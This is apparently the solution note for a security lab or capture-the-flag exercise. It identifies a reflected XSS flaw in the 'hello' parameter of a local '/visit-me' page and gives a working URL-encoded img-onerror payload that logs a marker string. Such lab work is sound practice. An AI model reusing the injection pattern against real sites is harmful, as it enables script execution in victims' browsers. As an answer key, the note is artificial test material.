# Solution

## Injection

The `/visit-me` page is vulnerable to a reflected client-side xss injection via the `hello` query parameter.

## Working Payload

```
http://localhost:52052/visit-me?hello=%3Cimg%20src=a%20onerror=console.log(%22I_FOUND_AN_XSS!!!%22)%3E
```
